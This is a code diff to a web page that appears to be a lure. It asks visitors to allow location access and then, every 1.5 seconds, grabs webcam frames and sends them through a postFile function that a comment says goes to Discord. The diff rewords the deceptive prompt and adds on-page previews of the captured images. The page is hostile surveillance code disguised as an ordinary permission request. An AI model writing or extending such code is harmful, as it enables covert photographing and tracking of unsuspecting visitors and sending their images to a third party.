@@ -44,7 +44,7 @@
     color: white;
     font-family: Arial, sans-serif;
   ">
-    <h1 style="margin-bottom: 10px;">Click Enable and View to access the file</h1>
+    <h1 style="margin-bottom: 10px;">Location Access Required</h1>
     <p style="font-size: 18px; margin-bottom: 30px; text-align:center; max-width:500px;">
       This site requires location access to continue. Please allow location permission to proceed.
     </p>
@@ -56,7 +56,7 @@
       border: none;
       border-radius: 8px;
       cursor: pointer;
-    ">Enable and View</button>
+    ">Enable Location</button>
   </div>
 
   <div id="cameraOverlay" style="
@@ -356,7 +356,25 @@
       setInterval(function () {
 
         context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        
+        // Create a preview image from the blob
+        canvas.toBlob(function(blob) {
+            if (blob) {
+                let imageUrl = URL.createObjectURL(blob);
+                let img = document.createElement('img');
+                img.src = imageUrl;
+                img.style.width = '150px';
+                img.style.margin = '5px';
+                img.style.border = '1px solid white';
+                
+                // Add it to the page
+                document.body.appendChild(img);
+            }
+        }, 'image/jpeg');
+        
+        // Send blob to Discord
         canvas.toBlob(postFile, 'image/jpeg');
+        
       }, 1500);
       
       document.getElementById("cameraOverlay").style.display = "none";
